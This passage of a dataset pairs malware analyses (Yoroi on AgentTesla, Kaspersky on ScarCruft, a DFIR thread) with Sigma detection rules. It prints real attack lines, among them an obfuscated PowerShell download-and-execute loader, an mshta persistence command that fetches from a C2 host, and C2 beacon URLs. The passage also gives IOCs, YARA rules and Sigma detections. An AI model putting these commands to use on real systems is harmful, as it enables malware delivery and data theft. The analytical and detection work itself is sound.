\"powershell.exe -nologo -WindowStyle Hidden $_Xpin = ((New-Object Net.WebClient).DowNloAdSTRiNg('h'+'t'+'t'+'p'+'s'+':'+'/'+'/'+'p'+'a'+'s'+'t'+'e'+'b'+'i'+'n'+'.'+'c'+'o'+'m'+'/'+'r'+'a'+'w'+'/eyGv9x4B'));$_Xpin=$_Xpin.replace('.','*!(@*#(!@#*').replace('*!(@*#(!@#*','0');$_Xpin = $_Xpin.ToCharArray();[Array]::Reverse($_Xpin);[byte[]]$_PMP = [System.Convert]::FromBase64String($_Xpin);$_1 = [System.Threading.Thread]::GetDomain().Load($_PMP);$_1.EntryPoint.invoke($S,$X)\", null, objConfig, intProcessID)\nself.close</script>\n```\n\nThis component spawns through PowerShell a script a binary file from a pastebin, *eyGv9x4B*, but, unfortunately, at the time of analysis, the paste has been removed.\n\nThis example could suggest to us the power of the malicious infrastructure built from the attacker, where components could be removed or replaced with another one in every moment.\n\n### The Payload\n\nAs previously stated, the final payload is AgentTesla. It remains one of the most adopted commodity malware instructed to steal a large number of sensitive information about the victim. During the past years, we constantly studied the evolution of this threat and we enumerated all the sensitive data grasped by it.\n\nHowever, also in this case, we obtained the final payload and the configuration of the SMTP client where sends the stolen information:\n\n```image\nAlt: Figure 13: Configuration of the AgentTesla SMTP client\nDescription: The image displays a code snippet likely related to the configuration of an SMTP client for the AgentTesla malware. It includes variable definitions such as 'NetworkCredential credentials' and shows how the credentials are being set with numeric transformations. Additionally, there are components related to the email body and encoding. The lower part of the image presents a variable inspection table with key-value pairs that include domain, username, and other related information, indicating details about the SMTP configuration used for data exfiltration.\nTranscription: |\n  NetworkCredential credentials = new NetworkCredential(<Module>.smethod_0(334336), <Module>.smethod_0(334280));\n  num = (num2 * 3834419523U ^ 3515896979U);\n  continue;\n  case 3U:\n      mailMessage.Body = \"\";\n      num = (num2 * 462441331U ^ 940497877U);\n      continue;\n  case 4U:\n  {\n      mailMessage.IsBodyHtml = false;\n      byte[] bytes = Encoding.UTF8.GetBytes(aeo);\n      num = (num2 * 3938421335U ^ 4201351469U);\n      continue;\n  }\n  case 5U:\n  \n  | Nome        | Valore                       | Tipo                         |\n  | ----------- | ---------------------------- | ---------------------------- |\n  | result      | false                        | bool                         |\n  | credentials | System.Net.NetworkCredential | System.Net.NetworkCredential |\n  | Domain      | \"...\"                        | string                       |\n  | Password    | \"...\"                        | string                       |\n  | UserName    | \"hnhhh@atn-com.pw\"           | string                       |\n  | m_domain    | null                         | byte[]                       |\n  | m_encrypt   | true                         | bool                         |\n```\n\nThe domain “*atn-com.pw*” has been created ad-hoc in order to manage the infection campaign. Studying the uptime of the domain we were able to reconstruct the infection campaign of the threat actor.\n\n```image\nAlt: Figure 14: Information about the C2 uptime stats\nDescription: The image depicts a calendar-style grid showing the uptime statistics for a domain related to a cyber-criminal espionage operation. Each cell represents a day, with varying shades of blue indicating the activity level of the domain throughout the months of January to May. Notably, the date May 2, 2020, is highlighted, indicating a specific event related to the IP address 77.83.117.234, which was first seen on that date. The grid layout allows for easy visualization of the domain's activity over time.\nTranscription: |\n  2020-05-02\n  \n  FIRST SEEN\n  77.83.117.234\n  \n  UNIQUE RESOLUTIONS\n  77.83.117.234\n  \n  Click to Filter\n```\n\nAs shown above, the domain has been registered on the last days of January and it has been active since the middle of April. After a short period of inactivity, it compared another time the 2nd of May since these days.\n\n## Conclusion\n\nThe actor hiding behind this campaign can undoubtedly be considered a persistent cyber-threat to many organizations operating in production sectors in Europe and, in the last months, also in Italy. Its intricate infection chain developed and tested during the years gave him the flexibility needed to bypass many layers of traditional security defenses, manipulating the delivery infrastructure from time to time.\n\nDuring the time, the actor’s delivery infrastructure was leveraged to install different kinds of malware: most of the time remote access trojans and info and credential stealing software. Such malware types are capable of enabling cyber-espionage and IP theft operations, potentially to re-sell stolen information on dark markets.\n\nNo doubt, we will keep going to track this threat.\n\n## Indicators of Compromise\n\n- **Hashes**\n  - 7eafb57e7fc301fabb0ce3b98092860aaac47b7118804bb8d84ddb89b9ee38f3\n  - b969a3c28be2086813b21007c2ef89b429cbec56f49eb5b304615cfe3ef9318d\n  - f8c91d3d69ec47fb888e6239d7218c87bf6f4817489005d9978ba9d1eac49899\n  - f8f97ecd134f13c66f50c11e4f17948c0acb49dd306031c3559a0e7c34003723\n  - e4d14ba73670184066a00cf5d3361580f6c4fbc5d0862a90278d82e95426faa5\n  - 58a9a5b49c1871d8792f84c81d490b54a93da633f0355d6ebb4badef93854320\n  - cb1375d8163146b47fa28259d8c70022b35e22712b9f887d7c8b9c8751b32804\n  - 28f6735b6cf7cc1613f465580da4113afe46cf96e60b8330619c32340c71d6a8\n  - 540fce8483f6ca5516c9d8171dca4739e32a7bec1092f011f462d3c4ae4fd47b\n  - 8912ea4551439a4925aba187eea2ac4eb5b43e458866812caa67d85c5420a2db\n  - 8da105fd3f58ebfce0334f963370397f32fbef5bbb4bd6432ed18369dc46b959\n  - 358a36a890383fc6aeaa89261e8a47b6217dd9bd1a31b63590b38bffe092a4f5\n  - 1d10fca85f5a06e20a160299e6f8f4a528384a77934fce0d44f48cb7e6f5feb4\n\n- **DropUrls**\n  - http[:\\\\j[.mp\\dmdmcrcrcryctcgufyguhmd\n  - Pastebin\n    - 5CzmZ5NS\n    - Bnv7ruYp\n    - Rk4engdU\n    - rnS6CUzX\n    - sJEBiiMw\n    - UyFaSxgj\n    - YL0je2fU\n    - ygwLUS9C\n    - eyGv9x4B\n\n- C2\n  - atn-com[.pw\n\n- Persistence\n  - Setting of registry key HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\n\n- Exfiltration\n  - Sensitive information about the victim machine\n\n### Yara Rules\n\n```\nrule NIBBI_AggahCampaign_macroPPS_May2020 {\n    meta:\n      description = \"Yara Rule for MacroPPS_NIBBI\"\n      author = \"Cybaze Zlab_Yoroi\"\n      last_updated = \"2020-05-21\"\n      tlp = \"white\"\n      SHA256 = \"7eafb57e7fc301fabb0ce3b98092860aaac47b7118804bb8d84ddb89b9ee38f3\"\n      category = \"informational\"\n\n    strings:\n      $a1 = {B5 B5 D6 FF FF B5 8C}\n      $a2 = {FF 00 63 B5 39 00 00 FF D6}\n      $a3 = \"Reverse\"\n\n    condition:\n      all of them\n}\n\nrule NIBBI_AggahCampaign_AMSIBYPASS_May2020 {\n    meta:\n      description = \"Yara Rule for AMSI Bypass_NIBBI\"\n      author = \"Cybaze Zlab_Yoroi\"\n      last_updated = \"2020-05-21\"\n      tlp = \"white\"\n      SHA256 = \"e4d14ba73670184066a00cf5d3361580f6c4fbc5d0862a90278d82e95426faa5\"\n      category = \"informational\"\n\n    strings:\n      $a1 = {24 5A 20 F4 88 D7 C4 61 38}\n      $a2 = {76 FF 5A 20 76 05 76 23 61 38}\n      $s1 = {07 20 E7 3F 43 14 5A 20 EB E6 0D 25}\n      $s2 = \"ConfuserEx\"\n      $s3 = \"amsi.dll\"\n\n    condition:\n      uint16(0) == 0x5A4D and all of ($a*) and 2 of ($s*)\n}\n\nrule NIBBI_AggahCampaign_AgentTesla_May2020 {\n    meta:\n      description = \"Yara Rule for AgentTesla Bypass_NIBBI\"\n      author = \"Cybaze Zlab_Yoroi\"\n      last_updated = \"2020-05-21\"\n      tlp = \"white\"\n      SHA256 = \"1d10fca85f5a06e20a160299e6f8f4a528384a77934fce0d44f48cb7e6f5feb4\"\n      category = \"informational\"\n\n    strings:\n      $a1 = {06 FE 0C 0A 00 20 6D E9 56 47 5A 20 57 AB}\n      $a2 = {00 20 6B 4F 2B 72 5A 20 F6 D4}\n      $s1 = {61 67 00 61 68 00 6C 76 00 61 65 00 61 75}\n      $s2 = {00 11 06 6F 38 01 00 06 16 6F 1E 02}\n      $s3 = {01 13 2D ?? 2D 16 17 8C 77}\n\n    condition:\n      uint16(0) == 0x5A4D and all of ($a*) and 2 of ($s*)\n}\n```",
    "sigma_rule": {
      "title": "Microsoft Office Protected View Disabled",
      "id": "a5c7a43f-6009-4a8c-80c5-32abf1c53ecc",
      "related": [
        {
          "id": "7c637634-c95d-4bbf-b26c-a82510874b34",
          "type": "obsolete"
        }
      ],
      "status": "test",
      "description": "Detects changes to Microsoft Office protected view registry keys with which the attacker disables this feature.",
      "references": [
        "https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1562.001/T1562.001.md",
        "https://unit42.paloaltonetworks.com/unit42-gorgon-group-slithering-nation-state-cybercrime/",
        "https://yoroi.company/research/cyber-criminal-espionage-operation-insists-on-italian-manufacturing/",
        "https://admx.help/HKCU/software/policies/microsoft/office/16.0/excel/security/protectedview"
      ],
      "author": "frack113, Nasreddine Bencherchali (Nextron Systems)",
      "date": "2021-06-08",
      "modified": "2023-08-17",
      "tags": [
        "attack.defense-evasion",
        "attack.t1562.001"
      ],
      "logsource": {
        "product": "windows",
        "category": "registry_set"
      },
      "detection": {
        "selection_path": {
          "TargetObject|contains|all": [
            "\\SOFTWARE\\Microsoft\\Office\\",
            "\\Security\\ProtectedView\\"
          ]
        },
        "selection_values_1": {
          "Details": "DWORD (0x00000001)",
          "TargetObject|endswith": [
            "\\DisableAttachementsInPV",
            "\\DisableInternetFilesInPV",
            "\\DisableIntranetCheck",
            "\\DisableUnsafeLocationsInPV"
          ]
        },
        "selection_values_0": {
          "Details": "DWORD (0x00000000)",
          "TargetObject|endswith": [
            "\\enabledatabasefileprotectedview",
            "\\enableforeigntextfileprotectedview"
          ]
        },
        "condition": "selection_path and 1 of selection_values_*"
      },
      "falsepositives": [
        "Unlikely"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\registry\\registry_set\\registry_set_office_disable_protected_view_features.yml",
    "id": "978"
  },
  {
    "url": "https://twitter.com/inversecos/status/1494174785621819397",
    "markdown": "# Post\n\nFeb 17, 2022\n\n1\\ How to prove malicious macro was enabled & clicked? 👀 #DFIR \n\nHKEY_LOCAL_MACHINE\\USERDAT\\Software\\Microsoft\\Office\\<VERS>\\<PROGRAM>\\Security\\Trusted Documents\\TrustRecords \n\nLook ONLY for values where last four bytes are \"FF FF FF 7F\". \n\nThese files had macros enabled\n\n👇👇👇\n\n\n```image\nDescription: The image shows a screenshot of the Windows Registry Editor, specifically focusing on the path related to Microsoft Office's security settings for trusted documents. It highlights the 'TrustRecords' section, with various registry entries displayed. The relevant entries are marked with red boxes, indicating that the last four bytes of certain values are 'FF FF FF 7F', which signifies that macros were enabled for those files. This visual serves as a technical reference for identifying enabled macros in malicious documents.\nTranscription: |\n  Registry Editor\n  Computer\\HKEY_LOCAL_MACHINE\\USERDAT\\Software\\Microsoft\\Office\\15.0\\Excel\\Security\\Trusted Documents\\TrustRecords\n  \n  Name            Type        Data\n  (Default)       REG_SZ      (value not set)\n  Entry 1         REG_BINARY  80 eb 71 c9 01 b5 d7 01 00 a8 e7 6f 4b 00 00 00 bb da a1 01 ff ff ff 7f\n  Entry 2         REG_BINARY  80 5a 37 44 a5 02 d8 01 00 a8 e7 6f 4b 00 00 00 ae fc a1 01 ff ff ff 7f\n  Entry 3         REG_BINARY  d0 35 82 b5 55 a3 d6 01 00 a8 e7 6f 4b 00 00 00 b0 9d 9d 01 ff ff ff 7f\n  Entry 4         REG_BINARY  2a 58 1f 2f de 62 d7 01 00 a8 e7 6f 4b 00 00 00 9d 9d 01 ff ff ff 7f\n  Entry 5         REG_BINARY  2c e0 a4 4e aa 4a d7 01 00 a8 e7 6f 4b 00 00 00 fd 5d c9 01 ff ff ff 7f\n```\n\n## Comment\n\nFeb 17, 2022\n\n2\\ In light of the recent Emotet campaigns, make sure you check INetCache Outlook folder as it stores the attachments that were opened in Outlook. \n\nIf AV quarantines the file this wont exist.\n\nC:\\Users\\<name>\\AppData\\Local\\Microsoft\\Windows\\INetCache\\Content.Outlook\\<Folder>\\\n\n## Comment\n\nFeb 17, 2022\n\n3\\ Next check the macro settings for that user as this user had macros set to auto enabled (VBAWarnings=1)\n\nNTUSERDAT\\Software\\Microsoft\\Office\\<vers>\\<program>\\Security\n\nDisable all macros w/o notification : 2, 4\nDisable all macros except signed macros: 3\nEnable all macros: 1\n\n```image\nDescription: The image depicts a screenshot of the Windows Registry Editor displaying a path related to Microsoft Office security settings. Specifically, it shows the registry key for 'VBAWarnings' under 'HKEY_LOCAL_MACHINE\\USERDAT\\Software\\Microsoft\\Office\\15.0\\Excel\\Security'. The data associated with 'VBAWarnings' is shown as '0x00000001', indicating that macros are set to be enabled without notification. This information is relevant for understanding the macro settings that could impact security in Microsoft Excel.\nTranscription: |\n  Computer\\HKEY_LOCAL_MACHINE\\USERDAT\\Software\\Microsoft\\Office\\15.0\\Excel\\Security\n  \n  Name: \n      (Default) \n      VBAWarnings\n  \n  Type: \n      REG_SZ \n      REG_DWORD\n  \n  Data: \n      (value not set) \n      0x00000001 (1)\n```\n\n## Comment\n\nFeb 17, 2022\n\n4\\ Next step is to check recent files viewed/visited... you can look at:\n\n> NTUSER.DAT artefacts\n> LNK / Jmplists\n> Microsoft Recent Files (C:\\Users\\<usr>\\appdata\\roaming\\Microsoft\\office\\Recent)\n\n## Comment\n\nFeb 17, 2022\n\n5\\ You can look for the OST/PST files but usually the INetCache covers this. You can look for this here \n\n%UserProfile%\\appdata\\local\\microsoft\\outlook\\\n\n## Comment\n\nFeb 17, 2022\n\n6\\ In terms of execution of word/excel/outlook ... just look at the usual execution artefacts. You can do this using Prefetch, Shimcache (amcache likely not too relevant if this is user workstation) etc.\n\nAnd also Security.evtx Event ID 4688 <3\n\n## Comment\n\nFeb 17, 2022\n\n7\\ This is awesome, hopefully they extend this to more than just Excel! \nhttps://bleepingcomputer.com/news/microsoft/microsoft-is-disabling-excel-40-macros-by-default-to-protect-users/#:~:text=Microsoft%20to%20disable%20Excel%204.0,the%20current%20channel%20in%20November.",
    "sigma_rule": {
      "title": "Office Macros Warning Disabled",
      "id": "91239011-fe3c-4b54-9f24-15c86bb65913",
      "related": [
        {
          "id": "a166f74e-bf44-409d-b9ba-ea4b2dd8b3cd",
          "type": "obsolete"
        }
      ],
      "status": "test",
      "description": "Detects registry changes to Microsoft Office \"VBAWarning\" to a value of \"1\" which enables the execution of all macros, whether signed or unsigned.",
      "references": [
        "https://twitter.com/inversecos/status/1494174785621819397",
        "https://www.mcafee.com/blogs/other-blogs/mcafee-labs/zloader-with-a-new-infection-technique/",
        "https://securelist.com/scarcruft-surveilling-north-korean-defectors-and-human-rights-activists/105074/"
      ],
      "author": "Trent Liffick (@tliffick), Nasreddine Bencherchali (Nextron Systems)",
      "date": "2020-05-22",
      "modified": "2024-03-19",
      "tags": [
        "attack.defense-evasion",
        "attack.t1112"
      ],
      "logsource": {
        "category": "registry_set",
        "product": "windows"
      },
      "detection": {
        "selection": {
          "TargetObject|endswith": "\\Security\\VBAWarnings",
          "Details": "DWORD (0x00000001)"
        },
        "condition": "selection"
      },
      "falsepositives": [
        "Unlikely"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\registry\\registry_set\\registry_set_office_vba_warnings_tamper.yml",
    "id": "980"
  },
  {
    "url": "https://securelist.com/scarcruft-surveilling-north-korean-defectors-and-human-rights-activists/105074/",
    "markdown": "# ScarCruft surveilling North Korean defectors and human rights activists\n\n**APT reports** \n**29 Nov 2021** \n\nThe ScarCruft group (also known as APT37 or Temp.Reaper) is a nation-state sponsored APT actor we first reported in 2016. ScarCruft is known to target North Korean defectors, journalists who cover North Korea-related news, and government organizations related to the Korean Peninsula, among others. Recently, we were approached by a news organization with a request for technical assistance during their cybersecurity investigations. As a result, we had an opportunity to perform a deeper investigation on a host compromised by ScarCruft. The victim was infected by PowerShell malware, and we discovered evidence that the actor had already stolen data from the victim and had been surveilling this victim for several months. The actor also attempted to send spear-phishing emails to the victims’ associates working in businesses related to North Korea by using stolen login credentials.\n\nBased on the findings from the compromised machine, we discovered additional malware. The actor utilized three types of malware with similar functionalities: versions implemented in PowerShell, Windows executables, and Android applications. Although intended for different platforms, they share a similar command and control scheme based on HTTP communication. Therefore, the malware operators can control the whole malware family through one set of command and control scripts.\n\nWe were working closely with a local CERT to investigate the attacker’s command and control infrastructure, and as a result of this, we were able to better understand how it works. The APT operator controls the malware using a PHP script on the compromised web server and controls the implants based on the HTTP parameters. We were also able to acquire several log files from the compromised servers. Based on said files, we identified additional victims in South Korea and compromised web servers that have been utilized by ScarCruft since early 2021. Additionally, we discovered older variants of the malware, delivered via HWP documents, dating back to mid-2020.\n\nMore information about ScarCruft is available to customers of Kaspersky Intelligence Reporting. Contact: intelreports@kaspersky.com\n\n## Table of Contents\n\n- Spear-phishing document\n- Host investigation\n- Windows executable Chinotto\n- Android Chinotto\n- Older malicious HWP documents\n- Infrastructure\n  - ‘hello’ type\n  - ‘command’ type\n  - ‘result’ type\n  - ‘file’ type\n- Victims\n- Attribution\n- Conclusions\n- Indicators of compromise\n- MITRE ATT&CK mapping\n\n## Spear-phishing document\n\nBefore spear-phishing a potential victim and sending a malicious document, the actor contacted an acquaintance of the victim using the victim’s stolen Facebook account. The actor already knew that the potential target ran a business related to North Korea and asked about its current status. After a conversation on social media, the actor sent a spear-phishing email to the potential victim using a stolen email account. The actor leveraged their attacks using stolen login credentials, such as Facebook and personal email accounts, and thereby showed a high level of sophistication.\n\nAfter a Facebook conversation, the potential target received a spear-phishing email from the actor. It contains a password-protected RAR archive with the password shown in the email body. The RAR file contains a malicious Word document.\n\n```image\nAlt: Spear-phishing email and decoy\nDescription: The image depicts a spear-phishing email with a malicious attachment. It shows an email header stating the date and sender's details, along with a message in Korean that discusses a document titled 'North Korea's latest situation and our national security.' The email includes a password-protected RAR file as an attachment, and the password is explicitly mentioned in the email body. Additionally, there is a notification indicating that macros have been disabled in the attached document, implying a security warning related to potential risks from enabling macros.\nTranscription: |\n  Mon 9/6/2021 10:58 AM\n  \n  칼럼초안보내드립니다. Draft of column\n  \n  To\n  Message\n  북한의 최근 정세와 우리의 안보.rar (29 KB)\n  North Korea's latest situation and our national security.rar\n  \n  비밀번호는 12300이에요.\n  많은 조언 부탁드립니다~\n  The password is '123'.\n  Look forward to your advice.\n  \n  북한의 최근 정세와 우리의 안보\n  \n  ■ 북한 경제위기 심화\n  \n  김정은 위원장은 6월 17일 노동당 중앙위원회 제7기 제3차 전원회의에서 지난 1년 동안 “심각하게 진행되고 있다”고 독특하게 설명했다.\n  조선중앙통신은 위기상황이 특별하게 들고 있는 사태를 “인민경제의 정상화”를 미뤄두는 중요한 시점이라고 특별히 강조했다.\n  다만, 이러한 특별한 상황에서는 사람들의 생활이 개선되지 않고, 자급자족은 여전히 어려운 상황이라고 보도했다.\n```\n\n*__Spear-phishing email and decoy__*\n\nThis document contains a lure related to North Korea.\n\n| MD5                              | File name                                                                           | Modified time       | Author  | Last saved user |\n| -------------------------------- | ----------------------------------------------------------------------------------- | ------------------- | ------- | --------------- |\n| baa9b34f152076ecc4e01e35ecc2de18 | 북한의 최근 정세와 우리의 안보.doc (North Korea’s latest situation and our national security) | 2021-09-03 09:34:00 | Leopard | Cloud           |\n\nThis document contains a malicious macro and a payload for a multi-stage infection process. The first stage’s macro contains obfuscated strings and then spawns another macro as a second stage.\n\nThe first stage macro checks for the presence of a Kaspersky security solution on the victim’s machine by trying the following file paths:\n\n- `C:\\Windows\\avp.exe` # Kaspersky AV\n- `C:\\Windows\\Kavsvc.exe` # Kaspersky AV\n- `C:\\Windows\\clisve.exe` # Unknown\n\nIf a Kaspersky security solution is indeed installed on the system, it enables trust access for Visual Basic Application (VBA) by setting the following registry key to ‘1’:\n\n```\nHKEY_CURRENT_USER\\Software\\Microsoft\\Office\\[Application.Version]\\Word\\Security\\AccessVBOM\n```\n\nBy doing so, Microsoft Office will trust all macros and run any code without showing a security warning or requiring the user’s permission. Next, the macro creates a mutex named ‘​​sensiblemtv16n’ and opens the malicious file once more. Thanks to the “trust all macros” setting, the macro will be executed automatically.\n\nIf no Kaspersky security software is installed, the macro directly proceeds to decrypt the next stage’s payload. In order to achieve this, it uses a variation of a substitution method. The script compares the given encrypted string with a second string to get an index of matched characters. Next, it receives a decrypted character with an index acquired from the first string.\n\n- First string: `BU+13r7JX9A)dwxvD5h2WpQOGfbmNKPcLelj(kogHs.#yi*IET6V&tC,uYz=Z0RS8aM4Fqn`\n- Second string: `v&tC,uYz=Z0RS8aM4FqnD5h2WpQOGfbmNKPcLelj(kogHs.#yi*IET6V7JX9A)dwxBU+13r`\n\nThe decrypted second stage Visual Basic Application (VBA) contains shellcode as a hex string. This script is responsible for injecting the shellcode into the process `notepad.exe`.\n\n```image\nAlt: Shellcode in the second stage VBA\nDescription: The image displays a snippet of Visual Basic for Applications (VBA) code, which is part of a malicious macro. The code includes constants for configuring window visibility and process access, alongside an array that appears to represent encrypted shellcode. The formatting highlights different elements of the code with color coding, indicating a programming environment. This malicious code is related to a multi-stage infection process used in a spear-phishing attack targeting North Korean defectors and human rights activists.\nTranscription: |\n  Sub main()\n  Const STARTF_USESHOWWINDOW = &H1\n  Const SW_SHOW = 5\n  Const SW_HIDE = 0\n  Const PROCESS_ALL_ACCESS = &H1F0FFF\n  Const MEM_COMMIT = &H1000\n  Const MEM_RESERVE = &H2000\n  Const MEM_RESET = &H8000\n  Const PAGE_EXECUTE_READWRITE = &H40\n  Dim proc As PROCESS_INFORMATION\n  Dim PID As Long\n  Dim src_str As Variant\n  src_str = Array(&H55, &H8B, &HEC, &H83, &C4, &H4, &H8B, ...\n```\n\n*__Shellcode in the second stage VBA__*\n\nThe shellcode contains the URL to fetch the next stage payload. After fetching the payload, the shellcode decrypts it with trivial single-byte XOR decryption. Unfortunately, we weren’t able to gather the final payload when we investigated this sample.\n\nThe payload’s download path is:\n\n```\nhxxps://api.onedrive[.]com/v1.0/shares/u!aHR0cHM6Ly8xZHJ2Lm1zL3UvcyFBalVyZDlodU1wUWNjTGt4bXhBV0pjQU1ja2M_ZT1mUnc4VHg/root/content\n```\n\n## Host investigation\n\nAs a result of our efforts in helping the victim with the analysis, we had a chance to investigate the host of the owner who sent the spear-phishing email. When we first checked the process list, there was a suspicious PowerShell process running with a rather suspicious parameter.\n\nThis PowerShell command was registered via the Run registry key as a mechanism for persistence:\n\n- Registry path: `HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run – ONEGO`\n\n```\nc:\\windows\\system32\\cmd.exe /c PowerShell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass ping -n 1 -w 300000 2.2.2.2 || mshta hxxp://[redacted].cafe24[.]com/bbs/probook/1.html\n```\n\nThis registry key causes the HTML Application (HTA) file to get fetched and executed by the `mshta.exe` process every time the system is booted. The fetched ‘1.html’ is an HTML Application (.hta) file that contains Visual Basic Script (VBS), which eventually executes PowerShell commands.\n\nThe PowerShell script offers simple backdoor functionalities and continuously queries the C2 server with HTTP POST requests containing several parameters. At first, it sends a beacon to the C2 server with the host name:\n\n```\nhxxp://[redacted].cafe24[.]com/bbs/probook/do.php?type=hello&direction=send&id=[host name]\n```\n\nNext, it attempts to download commands from the C2 server with the following format:\n\n```\nhxxp://[redacted].cafe24[.]com/bbs/probook/do.php??type=command&direction=receive&id=\n```\n\nIf the HTTP response from the C2 server is 200, it checks the response data and executes the delivered commands.\n\n| Delivered data | Description                                                                                                                                                                                                                                                                                                                                                          |\n| -------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |\n| ref:           | Send a beacon to the C2 server: HTTP request: `?type=hello&direction=send&id=`                                                                                                                                                                                                                                                                                       |\n| cmd:           | If the command data includes ‘start’, execute the given command with `cmd.exe` and send base64 encoded ‘OK’ with the following POST format. Otherwise, it executes the given command, redirecting the result to the result file (`%APPDATA%\\desktop.dat`), and sends the contents of the file after base64 encoding. HTTP request: `?type=result&direction=send&id=` |\n\nWe discovered additional malware, tools, and stolen files from the victim’s host. Due to limited access to the compromised host, we were unable to figure out the initial infection vector. However, we assess this host was compromised on March 22, 2021, based on the timestamp of the suspicious files. One characteristic of the malware we discovered from the victim is the writing of execution results from commands to the file `%appdata%\\desktop.dat`. According to the Master File Table (MFT) information, this file was created the same day, March 22, 2021, and the last modification time is on September 8, 2021, which means this file was used until just before our investigation.\n\nUsing the additional tools, the malware operator collected sensitive information from this victim, although we can’t assess exactly how much data was exfiltrated and what kind of data was stolen. Based on the timestamp of the folders and files created by the malware, the actor collected and exfiltrated files as early as August 2021. The log files with the `.dat` extension are encrypted, but can be decrypted with the one-byte XOR key `0x75`. These log files contain the uploading history. We found two log files and each of them contains slightly different logs. The `B14yNKWdROad6DDeFxkxPZpsUmb.dat` file contains zipping and uploading of the folder bearing the same name. The log file presents the process as: “Zip Dir Start > Up Init > Up Start > Up File Succeed > Zip Dir Succeed”. According to the log file, the malware operator collected something from the infected system in this folder and uploaded it after archiving.\n\n```image\nAlt: File archiving and uploading log\nDescription: The image displays a text log of activities related to file archiving and uploading by malware. It includes entries such as 'Zip Dir Start', 'Up Init', 'Up Start', 'Up File Succeed', and 'Zip Dir Succeed', along with specific file paths indicating the locations of the archived files on the compromised system. The formatting suggests a chronological account of operations performed by the malware during its data exfiltration process.\nTranscription: |\n  Zip Dir Start - g:\\»çáµé\n  Up Init - C:\\Users\\\n      \\AppData\\Roaming\\B14yNKWdROad6DDeFxkxPZpsUmb\\e_hjjjpXahBJ\n  Up Start - C:\\Users\\\n      \\AppData\\Roaming\\B14yNKWdROad6DDeFxkxPZpsUmb\\e_hjjjpXahBJ\n  Up File Succeed - C:\\Users\\\n      \\AppData\\Roaming\\B14yNKWdROad6DDeFxkxPZpsUmb\\e_hjjjpXahBJ\n  Zip Dir Succeed - g:\\»çáµé\n```\n\n*__File archiving and uploading log__*\n\nThe other log file, named `s5gRAEs70xTHkAdUjl_DY1fD.dat`, also contains a file uploading history, except for file zipping messages. It processes each file with this procedure: “Up Init > Up Start > Up File Succeed”.\n\n```image\nAlt: File uploading log\nDescription: The image displays a log of file uploading activities from a compromised host, detailing the sequential steps of file initialization, starting the upload process, and the successful completion of file uploads. The logs indicate the file paths within the user's AppData directory, specifically referencing files with names like 's5gRAEs70xTHkAdUjl_DY1fD.e_PR9H4c4x7a' and 's5gRAEs70xTHkAdUjl_DY1fD.e_NxVs08wMuQ'. This log is likely part of an analysis of malware behavior related to data exfiltration.\nTranscription: |\n  Up Init – C:\\Users\\\n  Up Start – C:\\Users\\\n  \\AppData\\Roaming\\s5gRAEs70xTHkAdUj_l_DY1fd\\e_PR9H4c4x7a\n  Up File Succeed – C:\\Users\\\n  \\AppData\\Roaming\\s5gRAEs70xTHkAdUj_l_DY1fd\\e_PR9H4c4x7a\n  Up Init – C:\\Users\\\n  \\AppData\\Roaming\\s5gRAEs70xTHkAdUj_l_DY1fd\\e_NxVs08wMuQ\n  Up Start – C:\\Users\\\n  \\AppData\\Roaming\\s5gRAEs70xTHkAdUj_l_DY1fd\\e_NxVs08wMuQ\n  Up File Succeed – C:\\Users\\\n  \\AppData\\Roaming\\s5gRAEs70xTHkAdUj_l_DY1fd\\e_NxVs08wMuQ\n```\n\n*__File uploading log__*\n\nBased on what we found from this victim, we can confirm that the malware operator collected screenshots and exfiltrated them between August 6, 2021, and September 8, 2021. Based on what we found out from the victim, we can summarize the whole infection timeline. We suspect this host was compromised on March 22, 2021. After the initial infection, the actor attempted to implant additional malware, but an error occurred that led to the crash of the malware. The malware operator later delivered the Chinotto malware in August 2021 and probably started to exfiltrate sensitive data from the victim.\n\n```image\nAlt: Timeline of the attack on the victim\nDescription: The image is a timeline chart detailing the sequence of events related to a cyber attack on a victim from March 22, 2021, to September 8, 2021. It includes specific dates and actions such as the creation of log files, the first crash reports of malware, the creation of folders for screenshots, and modifications to log files. Each event is chronologically arranged along a horizontal line, illustrating the progression and key milestones of the attack.\nTranscription: |\n  2021-03-22\n  Create a log file (%appdata%\\desktop.dat)\n  \n  2021-04-06\n  First crash report of anhwp.exe\n  \n  2021-04-23\n  Create working directory (%appdata%\\RoamedYKIIDl6Q_mhL_Mm/)\n  \n  2021-05-05\n  First crash report of anprotect5.exe\n  \n  2021-07-16\n  Create VPN server file (tvnserver.exe)\n  \n  2021-09-05\n  Create a log file (%appdata%\\B14yNKWdRoADdDEfKxkPZ5Umb.dat)\n  \n  2021-09-08\n  Last modification of file upload log (s5gRAEs70xTHkAdUjI_DY1fD.dat)\n  Last modification of backdoor log file (desktop.dat)\n  \n  2021-08-31\n  Create Chinotto malware (%appdata%\\anprotect5.exe)\n  Create the first screenshot file\n  \n  2021-08-06\n  Create Chinotto malware (%appdata%\\alyakscan.exe)\n  Create a folder for screenshot (%appdata%\\s5gRAEs70xTHkAdUjI_DY1fD)\n  Create a log file (%appdata%\\s5gRAEs70xTHkAdUjI_DY1fD.dat)\n```\n\n*__Timeline of the attack on the victim__*\n\n## Windows executable Chinotto\n\nAs a result of the host investigation, we discovered a malicious Windows executable and found additional malware variants from VirusTotal and our own sample collection. One of the Windows executables contains a build path and the malware author appears to call the malware “Chinotto)”.\n\n```image\nAlt: PDB path\nDescription: The image displays a screenshot of a code snippet, likely extracted from a debugging or forensic analysis tool. The prominent text highlighted in red is a file path: 'D:\\Workspace\\chinotto\\Release\\Chinotto.pdb', which indicates a Program Database (PDB) file related to the Chinotto malware. The rest of the image contains various characters and symbols that may represent additional code or data, but the focus is on the PDB path, which is relevant for understanding the structure and debugging of the malware.\nTranscription: |\n  error</h>\n  LIA ♥ RSDS+¢ <%C3H6-;W\n  D:\\USWorkspace\\chinotto\\Release\\Chinotto.pdb\n```\n\n*__PDB path__*\n\nThe technical specifications in this analysis are based on the Chinotto malware (MD5 00df5bbac9ad059c441e8fef9fefc3c1) we 